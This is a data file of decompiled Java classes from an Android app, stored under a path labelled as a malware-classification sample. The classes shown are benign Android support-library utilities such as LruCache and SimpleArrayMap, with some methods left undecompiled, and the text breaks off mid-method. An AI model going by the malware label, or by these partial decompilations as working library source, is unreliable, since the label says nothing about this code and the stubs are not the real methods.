"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\EntrySet.code","final class EntrySet implements Set<Map.Entry<K,V>> {   EntrySet(){   }   @Override public boolean add(  Map.Entry<K,V> object){     throw new UnsupportedOperationException();   }   @Override public boolean addAll(  Collection<? extends Map.Entry<K,V>> collection){     int oldSize=MapCollections.this.colGetSize();     for (    Map.Entry<K,V> entry : collection) {       MapCollections.this.colPut(entry.getKey(),entry.getValue());     }     return oldSize != MapCollections.this.colGetSize();   }   @Override public void clear(){     MapCollections.this.colClear();   }   @Override public boolean contains(  Object o){     if (!(o instanceof Map.Entry)) {       return false;     }     Map.Entry<?,?> e=(Map.Entry)o;     int index=MapCollections.this.colIndexOfKey(e.getKey());     if (index < 0) {       return false;     }     Object foundVal=MapCollections.this.colGetEntry(index,1);     return ContainerHelpers.equal(foundVal,e.getValue());   }   @Override public boolean containsAll(  Collection<?> collection){     Iterator<?> it=collection.iterator();     while (it.hasNext()) {       if (!contains(it.next())) {         return false;       }     }     return true;   }   @Override public boolean isEmpty(){     return MapCollections.this.colGetSize() == 0;   }   @Override public Iterator<Map.Entry<K,V>> iterator(){     return new MapIterator();   }   @Override public boolean remove(  Object object){     throw new UnsupportedOperationException();   }   @Override public boolean removeAll(  Collection<?> collection){     throw new UnsupportedOperationException();   }   @Override public boolean retainAll(  Collection<?> collection){     throw new UnsupportedOperationException();   }   @Override public int size(){     return MapCollections.this.colGetSize();   }   @Override public Object[] toArray(){     throw new UnsupportedOperationException();   }   @Override public <T>T[] toArray(  T[] array){     throw new UnsupportedOperationException();   }   @Override public boolean equals(  Object object){     return MapCollections.equalsSetHelper(this,object);   }   @Override public int hashCode(){     int result=0;     for (int i=MapCollections.this.colGetSize() - 1; i >= 0; i--) {       Object key=MapCollections.this.colGetEntry(i,0);       Object value=MapCollections.this.colGetEntry(i,1);       result+=(value == null ? 0 : value.hashCode()) ^ (key == null ? 0 : key.hashCode());     }     return result;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\KeySet.code","final class KeySet implements Set<K> {   KeySet(){   }   @Override public boolean add(  K object){     throw new UnsupportedOperationException();   }   @Override public boolean addAll(  Collection<? extends K> collection){     throw new UnsupportedOperationException();   }   @Override public void clear(){     MapCollections.this.colClear();   }   @Override public boolean contains(  Object object){     return MapCollections.this.colIndexOfKey(object) >= 0;   }   @Override public boolean containsAll(  Collection<?> collection){     return MapCollections.containsAllHelper(MapCollections.this.colGetMap(),collection);   }   @Override public boolean isEmpty(){     return MapCollections.this.colGetSize() == 0;   }   @Override public Iterator<K> iterator(){     return new ArrayIterator(0);   }   @Override public boolean remove(  Object object){     int index=MapCollections.this.colIndexOfKey(object);     if (index < 0) {       return false;     }     MapCollections.this.colRemoveAt(index);     return true;   }   @Override public boolean removeAll(  Collection<?> collection){     return MapCollections.removeAllHelper(MapCollections.this.colGetMap(),collection);   }   @Override public boolean retainAll(  Collection<?> collection){     return MapCollections.retainAllHelper(MapCollections.this.colGetMap(),collection);   }   @Override public int size(){     return MapCollections.this.colGetSize();   }   @Override public Object[] toArray(){     return MapCollections.this.toArrayHelper(0);   }   @Override public <T>T[] toArray(  T[] tArr){     return (T[])MapCollections.this.toArrayHelper(tArr,0);   }   @Override public boolean equals(  Object object){     return MapCollections.equalsSetHelper(this,object);   }   @Override public int hashCode(){     int result=0;     for (int i=MapCollections.this.colGetSize() - 1; i >= 0; i--) {       Object obj=MapCollections.this.colGetEntry(i,0);       result+=obj == null ? 0 : obj.hashCode();     }     return result;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\LogWriter.code","public class LogWriter extends Writer {   private StringBuilder mBuilder=new StringBuilder(128);   private final String mTag;   public LogWriter(  String tag){     this.mTag=tag;   }   @Override public void close(){     flushBuilder();   }   @Override public void flush(){     flushBuilder();   }   @Override public void write(  char[] buf,  int offset,  int count){     for (int i=0; i < count; i++) {       char c=buf[offset + i];       if (c == '\n') {         flushBuilder();       }  else {         this.mBuilder.append(c);       }     }   }   private void flushBuilder(){     if (this.mBuilder.length() > 0) {       Log.d(this.mTag,this.mBuilder.toString());       this.mBuilder.delete(0,this.mBuilder.length());     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\LongSparseArray.code","public class LongSparseArray<E> implements Cloneable {   private static final Object DELETED=new Object();   private boolean mGarbage;   private long[] mKeys;   private int mSize;   private Object[] mValues;   public LongSparseArray(){     this(10);   }   public LongSparseArray(  int initialCapacity){     this.mGarbage=false;     if (initialCapacity == 0) {       this.mKeys=ContainerHelpers.EMPTY_LONGS;       this.mValues=ContainerHelpers.EMPTY_OBJECTS;     }  else {       int initialCapacity2=ContainerHelpers.idealLongArraySize(initialCapacity);       this.mKeys=new long[initialCapacity2];       this.mValues=new Object[initialCapacity2];     }     this.mSize=0;   }   public LongSparseArray<E> m0clone(){     LongSparseArray<E> clone=null;     try {       clone=(LongSparseArray)super.clone();       clone.mKeys=(long[])this.mKeys.clone();       clone.mValues=(Object[])this.mValues.clone();       return clone;     }  catch (    CloneNotSupportedException e) {       return clone;     }   }   public E get(  long key){     return get(key,null);   }   public E get(  long j,  E e){     int binarySearch=ContainerHelpers.binarySearch(this.mKeys,this.mSize,j);     return (binarySearch < 0 || this.mValues[binarySearch] == DELETED) ? e : (E)this.mValues[binarySearch];   }   public void delete(  long key){     int i=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);     if (i >= 0 && this.mValues[i] != DELETED) {       this.mValues[i]=DELETED;       this.mGarbage=true;     }   }   public void remove(  long key){     delete(key);   }   public void removeAt(  int index){     if (this.mValues[index] != DELETED) {       this.mValues[index]=DELETED;       this.mGarbage=true;     }   }   private void gc(){     int n=this.mSize;     int o=0;     long[] keys=this.mKeys;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       Object val=values[i];       if (val != DELETED) {         if (i != o) {           keys[o]=keys[i];           values[o]=val;           values[i]=null;         }         o++;       }     }     this.mGarbage=false;     this.mSize=o;   }   public void put(  long key,  E value){     int i=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);     if (i >= 0) {       this.mValues[i]=value;       return;     }     int i2=i ^ (-1);     if (i2 < this.mSize && this.mValues[i2] == DELETED) {       this.mKeys[i2]=key;       this.mValues[i2]=value;       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();       i2=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key) ^ (-1);     }     if (this.mSize >= this.mKeys.length) {       int n=ContainerHelpers.idealLongArraySize(this.mSize + 1);       long[] nkeys=new long[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     if (this.mSize - i2 != 0) {       System.arraycopy(this.mKeys,i2,this.mKeys,i2 + 1,this.mSize - i2);       System.arraycopy(this.mValues,i2,this.mValues,i2 + 1,this.mSize - i2);     }     this.mKeys[i2]=key;     this.mValues[i2]=value;     this.mSize++;   }   public int size(){     if (this.mGarbage) {       gc();     }     return this.mSize;   }   public long keyAt(  int index){     if (this.mGarbage) {       gc();     }     return this.mKeys[index];   }   public E valueAt(  int i){     if (this.mGarbage) {       gc();     }     return (E)this.mValues[i];   }   public void setValueAt(  int index,  E value){     if (this.mGarbage) {       gc();     }     this.mValues[index]=value;   }   public int indexOfKey(  long key){     if (this.mGarbage) {       gc();     }     return ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);   }   public int indexOfValue(  E value){     if (this.mGarbage) {       gc();     }     for (int i=0; i < this.mSize; i++) {       if (this.mValues[i] == value) {         return i;       }     }     return -1;   }   public void clear(){     int n=this.mSize;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       values[i]=null;     }     this.mSize=0;     this.mGarbage=false;   }   public void append(  long key,  E value){     if (this.mSize != 0 && key <= this.mKeys[this.mSize - 1]) {       put(key,value);       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();     }     int pos=this.mSize;     if (pos >= this.mKeys.length) {       int n=ContainerHelpers.idealLongArraySize(pos + 1);       long[] nkeys=new long[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     this.mKeys[pos]=key;     this.mValues[pos]=value;     this.mSize=pos + 1;   }   public String toString(){     if (size() <= 0) {       return ""{}"";     }     StringBuilder buffer=new StringBuilder(this.mSize * 28);     buffer.append('{');     for (int i=0; i < this.mSize; i++) {       if (i > 0) {         buffer.append("", "");       }       long key=keyAt(i);       buffer.append(key);       buffer.append('=');       Object value=valueAt(i);       if (value != this) {         buffer.append(value);       }  else {         buffer.append(""(this Map)"");       }     }     buffer.append('}');     return buffer.toString();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\LruCache.code","public class LruCache<K,V> {   private int createCount;   private int evictionCount;   private int hitCount;   private final LinkedHashMap<K,V> map;   private int maxSize;   private int missCount;   private int putCount;   private int size;   public LruCache(  int maxSize){     if (maxSize <= 0) {       throw new IllegalArgumentException(""maxSize <= 0"");     }     this.maxSize=maxSize;     this.map=new LinkedHashMap<>(0,0.75f,true);   }   public final V get(  K k){     V v;     if (k == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       V v2=this.map.get(k);       if (v2 != null) {         this.hitCount++;         return v2;       }       this.missCount++;       V create=create(k);       if (create == null) {         return null;       } synchronized (this) {         this.createCount++;         v=(V)this.map.put(k,create);         if (v != null) {           this.map.put(k,v);         }  else {           this.size+=safeSizeOf(k,create);         }       }       if (v != null) {         entryRemoved(false,k,create,v);         return v;       }       trimToSize(this.maxSize);       return create;     }   }   public final V put(  K key,  V value){     V previous;     if (key == null || value == null) {       throw new NullPointerException(""key == null || value == null"");     } synchronized (this) {       this.putCount++;       this.size+=safeSizeOf(key,value);       previous=this.map.put(key,value);       if (previous != null) {         this.size-=safeSizeOf(key,previous);       }     }     if (previous != null) {       entryRemoved(false,key,previous,value);     }     trimToSize(this.maxSize);     return previous;   }   public void trimToSize(  int r7){     throw new UnsupportedOperationException(""Method not decompiled: android.support.v4.util.LruCache.trimToSize(int):void"");   }   public final V remove(  K key){     V previous;     if (key == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       previous=this.map.remove(key);       if (previous != null) {         this.size-=safeSizeOf(key,previous);       }     }     if (previous != null) {       entryRemoved(false,key,previous,null);     }     return previous;   }   protected void entryRemoved(  boolean evicted,  K key,  V oldValue,  V newValue){   }   protected V create(  K key){     return null;   }   private int safeSizeOf(  K key,  V value){     int result=sizeOf(key,value);     if (result < 0) {       throw new IllegalStateException(""Negative size: "" + key + ""=""+ value);     }     return result;   }   protected int sizeOf(  K key,  V value){     return 1;   }   public final void evictAll(){     trimToSize(-1);   }   public final synchronized int size(){     return this.size;   }   public final synchronized int maxSize(){     return this.maxSize;   }   public final synchronized int hitCount(){     return this.hitCount;   }   public final synchronized int missCount(){     return this.missCount;   }   public final synchronized int createCount(){     return this.createCount;   }   public final synchronized int putCount(){     return this.putCount;   }   public final synchronized int evictionCount(){     return this.evictionCount;   }   public final synchronized Map<K,V> snapshot(){     return new LinkedHashMap(this.map);   }   public final synchronized String toString(){     String format; synchronized (this) {       int accesses=this.hitCount + this.missCount;       int hitPercent=accesses != 0 ? (this.hitCount * 100) / accesses : 0;       format=String.format(""LruCache[maxSize=%d,hits=%d,misses=%d,hitRate=%d%%]"",Integer.valueOf(this.maxSize),Integer.valueOf(this.hitCount),Integer.valueOf(this.missCount),Integer.valueOf(hitPercent));     }     return format;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\MapCollections.code","public abstract class MapCollections<K,V> {   MapCollections<K,V>.EntrySet mEntrySet;   MapCollections<K,V>.KeySet mKeySet;   MapCollections<K,V>.ValuesCollection mValues;   protected abstract void colClear();   protected abstract Object colGetEntry(  int i,  int i2);   protected abstract Map<K,V> colGetMap();   protected abstract int colGetSize();   protected abstract int colIndexOfKey(  Object obj);   protected abstract int colIndexOfValue(  Object obj);   protected abstract void colPut(  K k,  V v);   protected abstract void colRemoveAt(  int i);   protected abstract V colSetValue(  int i,  V v); final class ArrayIterator<T> implements Iterator<T> {     boolean mCanRemove=false;     int mIndex;     final int mOffset;     int mSize;     ArrayIterator(    int offset){       this.mOffset=offset;       this.mSize=MapCollections.this.colGetSize();     }     @Override public boolean hasNext(){       return this.mIndex < this.mSize;     }     @Override public T next(){       T t=(T)MapCollections.this.colGetEntry(this.mIndex,this.mOffset);       this.mIndex++;       this.mCanRemove=true;       return t;     }     @Override public void remove(){       if (!this.mCanRemove) {         throw new IllegalStateException();       }       this.mIndex--;       this.mSize--;       this.mCanRemove=false;       MapCollections.this.colRemoveAt(this.mIndex);     }   } final class MapIterator implements Iterator<Map.Entry<K,V>>, Map.Entry<K,V> {     int mEnd;     boolean mEntryValid=false;     int mIndex=-1;     MapIterator(){       this.mEnd=MapCollections.this.colGetSize() - 1;     }     @Override public boolean hasNext(){       return this.mIndex < this.mEnd;     }     @Override public Map.Entry<K,V> next(){       this.mIndex++;       this.mEntryValid=true;       return this;     }     @Override public void remove(){       if (!this.mEntryValid) {         throw new IllegalStateException();       }       this.mIndex--;       this.mEnd--;       this.mEntryValid=false;       MapCollections.this.colRemoveAt(this.mIndex);     }     @Override public K getKey(){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       return (K)MapCollections.this.colGetEntry(this.mIndex,0);     }     @Override public V getValue(){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       return (V)MapCollections.this.colGetEntry(this.mIndex,1);     }     @Override public V setValue(    V v){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       return (V)MapCollections.this.colSetValue(this.mIndex,v);     }     @Override public final boolean equals(    Object o){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       if (!(o instanceof Map.Entry)) {         return false;       }       Map.Entry<?,?> e=(Map.Entry)o;       return ContainerHelpers.equal(e.getKey(),MapCollections.this.colGetEntry(this.mIndex,0)) && ContainerHelpers.equal(e.getValue(),MapCollections.this.colGetEntry(this.mIndex,1));     }     @Override public final int hashCode(){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       Object key=MapCollections.this.colGetEntry(this.mIndex,0);       Object value=MapCollections.this.colGetEntry(this.mIndex,1);       return (value != null ? value.hashCode() : 0) ^ (key == null ? 0 : key.hashCode());     }     public final String toString(){       return getKey() + ""="" + getValue();     }   } final class EntrySet implements Set<Map.Entry<K,V>> {     EntrySet(){     }     @Override public boolean add(    Map.Entry<K,V> object){       throw new UnsupportedOperationException();     }     @Override public boolean addAll(    Collection<? extends Map.Entry<K,V>> collection){       int oldSize=MapCollections.this.colGetSize();       for (      Map.Entry<K,V> entry : collection) {         MapCollections.this.colPut(entry.getKey(),entry.getValue());       }       return oldSize != MapCollections.this.colGetSize();     }     @Override public void clear(){       MapCollections.this.colClear();     }     @Override public boolean contains(    Object o){       if (!(o instanceof Map.Entry)) {         return false;       }       Map.Entry<?,?> e=(Map.Entry)o;       int index=MapCollections.this.colIndexOfKey(e.getKey());       if (index < 0) {         return false;       }       Object foundVal=MapCollections.this.colGetEntry(index,1);       return ContainerHelpers.equal(foundVal,e.getValue());     }     @Override public boolean containsAll(    Collection<?> collection){       Iterator<?> it=collection.iterator();       while (it.hasNext()) {         if (!contains(it.next())) {           return false;         }       }       return true;     }     @Override public boolean isEmpty(){       return MapCollections.this.colGetSize() == 0;     }     @Override public Iterator<Map.Entry<K,V>> iterator(){       return new MapIterator();     }     @Override public boolean remove(    Object object){       throw new UnsupportedOperationException();     }     @Override public boolean removeAll(    Collection<?> collection){       throw new UnsupportedOperationException();     }     @Override public boolean retainAll(    Collection<?> collection){       throw new UnsupportedOperationException();     }     @Override public int size(){       return MapCollections.this.colGetSize();     }     @Override public Object[] toArray(){       throw new UnsupportedOperationException();     }     @Override public <T>T[] toArray(    T[] array){       throw new UnsupportedOperationException();     }     @Override public boolean equals(    Object object){       return MapCollections.equalsSetHelper(this,object);     }     @Override public int hashCode(){       int result=0;       for (int i=MapCollections.this.colGetSize() - 1; i >= 0; i--) {         Object key=MapCollections.this.colGetEntry(i,0);         Object value=MapCollections.this.colGetEntry(i,1);         result+=(value == null ? 0 : value.hashCode()) ^ (key == null ? 0 : key.hashCode());       }       return result;     }   } final class KeySet implements Set<K> {     KeySet(){     }     @Override public boolean add(    K object){       throw new UnsupportedOperationException();     }     @Override public boolean addAll(    Collection<? extends K> collection){       throw new UnsupportedOperationException();     }     @Override public void clear(){       MapCollections.this.colClear();     }     @Override public boolean contains(    Object object){       return MapCollections.this.colIndexOfKey(object) >= 0;     }     @Override public boolean containsAll(    Collection<?> collection){       return MapCollections.containsAllHelper(MapCollections.this.colGetMap(),collection);     }     @Override public boolean isEmpty(){       return MapCollections.this.colGetSize() == 0;     }     @Override public Iterator<K> iterator(){       return new ArrayIterator(0);     }     @Override public boolean remove(    Object object){       int index=MapCollections.this.colIndexOfKey(object);       if (index < 0) {         return false;       }       MapCollections.this.colRemoveAt(index);       return true;     }     @Override public boolean removeAll(    Collection<?> collection){       return MapCollections.removeAllHelper(MapCollections.this.colGetMap(),collection);     }     @Override public boolean retainAll(    Collection<?> collection){       return MapCollections.retainAllHelper(MapCollections.this.colGetMap(),collection);     }     @Override public int size(){       return MapCollections.this.colGetSize();     }     @Override public Object[] toArray(){       return MapCollections.this.toArrayHelper(0);     }     @Override public <T>T[] toArray(    T[] tArr){       return (T[])MapCollections.this.toArrayHelper(tArr,0);     }     @Override public boolean equals(    Object object){       return MapCollections.equalsSetHelper(this,object);     }     @Override public int hashCode(){       int result=0;       for (int i=MapCollections.this.colGetSize() - 1; i >= 0; i--) {         Object obj=MapCollections.this.colGetEntry(i,0);         result+=obj == null ? 0 : obj.hashCode();       }       return result;     }   } final class ValuesCollection implements Collection<V> {     ValuesCollection(){     }     @Override public boolean add(    V object){       throw new UnsupportedOperationException();     }     @Override public boolean addAll(    Collection<? extends V> collection){       throw new UnsupportedOperationException();     }     @Override public void clear(){       MapCollections.this.colClear();     }     @Override public boolean contains(    Object object){       return MapCollections.this.colIndexOfValue(object) >= 0;     }     @Override public boolean containsAll(    Collection<?> collection){       Iterator<?> it=collection.iterator();       while (it.hasNext()) {         if (!contains(it.next())) {           return false;         }       }       return true;     }     @Override public boolean isEmpty(){       return MapCollections.this.colGetSize() == 0;     }     @Override public Iterator<V> iterator(){       return new ArrayIterator(1);     }     @Override public boolean remove(    Object object){       int index=MapCollections.this.colIndexOfValue(object);       if (index < 0) {         return false;       }       MapCollections.this.colRemoveAt(index);       return true;     }     @Override public boolean removeAll(    Collection<?> collection){       int N=MapCollections.this.colGetSize();       boolean changed=false;       int i=0;       while (i < N) {         Object cur=MapCollections.this.colGetEntry(i,1);         if (collection.contains(cur)) {           MapCollections.this.colRemoveAt(i);           i--;           N--;           changed=true;         }         i++;       }       return changed;     }     @Override public boolean retainAll(    Collection<?> collection){       int N=MapCollections.this.colGetSize();       boolean changed=false;       int i=0;       while (i < N) {         Object cur=MapCollections.this.colGetEntry(i,1);         if (!collection.contains(cur)) {           MapCollections.this.colRemoveAt(i);           i--;           N--;           changed=true;         }         i++;       }       return changed;     }     @Override public int size(){       return MapCollections.this.colGetSize();     }     @Override public Object[] toArray(){       return MapCollections.this.toArrayHelper(1);     }     @Override public <T>T[] toArray(    T[] tArr){       return (T[])MapCollections.this.toArrayHelper(tArr,1);     }   }   public static <K,V>boolean containsAllHelper(  Map<K,V> map,  Collection<?> collection){     Iterator<?> it=collection.iterator();     while (it.hasNext()) {       if (!map.containsKey(it.next())) {         return false;       }     }     return true;   }   public static <K,V>boolean removeAllHelper(  Map<K,V> map,  Collection<?> collection){     int oldSize=map.size();     Iterator<?> it=collection.iterator();     while (it.hasNext()) {       map.remove(it.next());     }     return oldSize != map.size();   }   public static <K,V>boolean retainAllHelper(  Map<K,V> map,  Collection<?> collection){     int oldSize=map.size();     Iterator<K> it=map.keySet().iterator();     while (it.hasNext()) {       if (!collection.contains(it.next())) {         it.remove();       }     }     return oldSize != map.size();   }   public Object[] toArrayHelper(  int offset){     int N=colGetSize();     Object[] result=new Object[N];     for (int i=0; i < N; i++) {       result[i]=colGetEntry(i,offset);     }     return result;   }   public <T>T[] toArrayHelper(  T[] tArr,  int i){     int colGetSize=colGetSize();     if (tArr.length < colGetSize) {       tArr=(Object[])Array.newInstance(tArr.getClass().getComponentType(),colGetSize);     }     for (int i2=0; i2 < colGetSize; i2++) {       tArr[i2]=colGetEntry(i2,i);     }     if (tArr.length > colGetSize) {       tArr[colGetSize]=0;     }     return tArr;   }   public static <T>boolean equalsSetHelper(  java.util.Set<T> r6,  java.lang.Object r7){     throw new UnsupportedOperationException(""Method not decompiled: android.support.v4.util.MapCollections.equalsSetHelper(java.util.Set, java.lang.Object):boolean"");   }   public Set<Map.Entry<K,V>> getEntrySet(){     if (this.mEntrySet == null) {       this.mEntrySet=new EntrySet();     }     return this.mEntrySet;   }   public Set<K> getKeySet(){     if (this.mKeySet == null) {       this.mKeySet=new KeySet();     }     return this.mKeySet;   }   public Collection<V> getValues(){     if (this.mValues == null) {       this.mValues=new ValuesCollection();     }     return this.mValues;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\MapIterator.code","final class MapIterator implements Iterator<Map.Entry<K,V>>, Map.Entry<K,V> {   int mEnd;   boolean mEntryValid=false;   int mIndex=-1;   MapIterator(){     this.mEnd=MapCollections.this.colGetSize() - 1;   }   @Override public boolean hasNext(){     return this.mIndex < this.mEnd;   }   @Override public Map.Entry<K,V> next(){     this.mIndex++;     this.mEntryValid=true;     return this;   }   @Override public void remove(){     if (!this.mEntryValid) {       throw new IllegalStateException();     }     this.mIndex--;     this.mEnd--;     this.mEntryValid=false;     MapCollections.this.colRemoveAt(this.mIndex);   }   @Override public K getKey(){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     return (K)MapCollections.this.colGetEntry(this.mIndex,0);   }   @Override public V getValue(){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     return (V)MapCollections.this.colGetEntry(this.mIndex,1);   }   @Override public V setValue(  V v){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     return (V)MapCollections.this.colSetValue(this.mIndex,v);   }   @Override public final boolean equals(  Object o){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     if (!(o instanceof Map.Entry)) {       return false;     }     Map.Entry<?,?> e=(Map.Entry)o;     return ContainerHelpers.equal(e.getKey(),MapCollections.this.colGetEntry(this.mIndex,0)) && ContainerHelpers.equal(e.getValue(),MapCollections.this.colGetEntry(this.mIndex,1));   }   @Override public final int hashCode(){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     Object key=MapCollections.this.colGetEntry(this.mIndex,0);     Object value=MapCollections.this.colGetEntry(this.mIndex,1);     return (value != null ? value.hashCode() : 0) ^ (key == null ? 0 : key.hashCode());   }   public final String toString(){     return getKey() + ""="" + getValue();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\SimpleArrayMap.code","public class SimpleArrayMap<K,V> {   private static final int BASE_SIZE=4;   private static final int CACHE_SIZE=10;   private static final boolean DEBUG=false;   private static final String TAG=""ArrayMap"";   static Object[] mBaseCache;   static int mBaseCacheSize;   static Object[] mTwiceBaseCache;   static int mTwiceBaseCacheSize;   Object[] mArray;   int[] mHashes;   int mSize;   public int indexOf(  Object key,  int hash){     int N=this.mSize;     if (N == 0) {       return -1;     }     int index=ContainerHelpers.binarySearch(this.mHashes,N,hash);     if (index >= 0 && !key.equals(this.mArray[index << 1])) {       int end=index + 1;       while (end < N && this.mHashes[end] == hash) {         if (key.equals(this.mArray[end << 1])) {           return end;         }         end++;       }       for (int i=index - 1; i >= 0 && this.mHashes[i] == hash; i--) {         if (key.equals(this.mArray[i << 1])) {           return i;         }       }       return end ^ (-1);     }     return index;   }   public int indexOfNull(){     int N=this.mSize;     if (N == 0) {       return -1;     }     int index=ContainerHelpers.binarySearch(this.mHashes,N,0);     if (index >= 0 && this.mArray[index << 1] != null) {       int end=index + 1;       while (end < N && this.mHashes[end] == 0) {         if (this.mArray[end << 1] == null) {           return end;         }         end++;       }       for (int i=index - 1; i >= 0 && this.mHashes[i] == 0; i--) {         if (this.mArray[i << 1] == null) {           return i;         }       }       return end ^ (-1);     }     return index;   }   private void allocArrays(  int size){     if (size == 8) { synchronized (ArrayMap.class) {         if (mTwiceBaseCache != null) {           Object[] array=mTwiceBaseCache;           this.mArray=array;           mTwiceBaseCache=(Object[])array[0];           this.mHashes=(int[])array[1];           array[1]=null;           array[0]=null;           mTwiceBaseCacheSize--;           return;         }       }     }  else     if (size == 4) { synchronized (ArrayMap.class) {         if (mBaseCache != null) {           Object[] array2=mBaseCache;           this.mArray=array2;           mBaseCache=(Object[])array2[0];           this.mHashes=(int[])array2[1];           array2[1]=null;           array2[0]=null;           mBaseCacheSize--;           return;         }       }     }     this.mHashes=new int[size];     this.mArray=new Object[size << 1];   }   private static void freeArrays(  int[] hashes,  Object[] array,  int size){     if (hashes.length == 8) { synchronized (ArrayMap.class) {         if (mTwiceBaseCacheSize < 10) {           array[0]=mTwiceBaseCache;           array[1]=hashes;           for (int i=(size << 1) - 1; i >= 2; i--) {             array[i]=null;           }           mTwiceBaseCache=array;           mTwiceBaseCacheSize++;         }       }       return;     }     if (hashes.length == 4) { synchronized (ArrayMap.class) {         if (mBaseCacheSize < 10) {           array[0]=mBaseCache;           array[1]=hashes;           for (int i2=(size << 1) - 1; i2 >= 2; i2--) {             array[i2]=null;           }           mBaseCache=array;           mBaseCacheSize++;         }       }     }   }   public SimpleArrayMap(){     this.mHashes=ContainerHelpers.EMPTY_INTS;     this.mArray=ContainerHelpers.EMPTY_OBJECTS;     this.mSize=0;   }   public SimpleArrayMap(  int capacity){     if (capacity == 0) {       this.mHashes=ContainerHelpers.EMPTY_INTS;       this.mArray=ContainerHelpers.EMPTY_OBJECTS;     }  else {       allocArrays(capacity);     }     this.mSize=0;   }   public SimpleArrayMap(  SimpleArrayMap map){     this();     if (map != null) {       putAll(map);     }   }   public void clear(){     if (this.mSize != 0) {       freeArrays(this.mHashes,this.mArray,this.mSize);       this.mHashes=ContainerHelpers.EMPTY_INTS;       this.mArray=ContainerHelpers.EMPTY_OBJECTS;       this.mSize=0;     }   }   public void ensureCapacity(  int minimumCapacity){     if (this.mHashes.length < minimumCapacity) {       int[] ohashes=this.mHashes;       Object[] oarray=this.mArray;       allocArrays(minimumCapacity);       if (this.mSize > 0) {         System.arraycopy(ohashes,0,this.mHashes,0,this.mSize);         System.arraycopy(oarray,0,this.mArray,0,this.mSize << 1);       }       freeArrays(ohashes,oarray,this.mSize);     }   }   public boolean containsKey(  Object key){     return key == null ? indexOfNull() >= 0 : indexOf(key,key.hashCode()) >= 0;   }   public int indexOfValue(  Object value){     int N=this.mSize * 2;     Object[] array=this.mArray;     if (value == null) {       for (int i=1; i < N; i+=2) {         if (array[i] == null) {           return i >> 1;         }       }     }  else {       for (int i2=1; i2 < N; i2+=2) {         if (value.equals(array[i2])) {           return i2 >> 1;         }       }     }     return -1;   }   public boolean containsValue(  Object value){     return indexOfValue(value) >= 0;   }   public V get(  Object obj){     int indexOfNull=obj == null ? indexOfNull() : indexOf(obj,obj.hashCode());     if (indexOfNull >= 0) {       return (V)this.mArray[(indexOfNull << 1) + 1];     }     return null;   }   public K keyAt(  int i){     return (K)this.mArray[i << 1];   }   public V valueAt(  int i){     return (V)this.mArray[(i << 1) + 1];   }   public V setValueAt(  int i,  V v){     int i2=(i << 1) + 1;     V v2=(V)this.mArray[i2];     this.mArray[i2]=v;     return v2;   }   public boolean isEmpty(){     return this.mSize <= 0;   }   public V put(  K k,  V v){     int hashCode;     int indexOf;     int i=8;     if (k == null) {       hashCode=0;       indexOf=indexOfNull();     }  else {       hashCode=k.hashCode();       indexOf=indexOf(k,hashCode);     }     if (indexOf >= 0) {       int i2=(indexOf << 1) + 1;       V v2=(V)this.mArray[i2];       this.mArray[i2]=v;       return v2;     }     int i3=indexOf ^ (-1);     if (this.mSize >= this.mHashes.length) {       if (this.mSize >= 8) {         i=this.mSize + (this.mSize >> 1);       }  else       if (this.mSize < 4) {         i=4;       }       int[] iArr=this.mHashes;       Object[] objArr=this.mArray;       allocArrays(i);       if (this.mHashes.length > 0) {         System.arraycopy(iArr,0,this.mHashes,0,iArr.length);         System.arraycopy(objArr,0,this.mArray,0,objArr.length);       }       freeArrays(iArr,objArr,this.mSize);     }     if (i3 < this.mSize) {       System.arraycopy(this.mHashes,i3,this.mHashes,i3 + 1,this.mSize - i3);       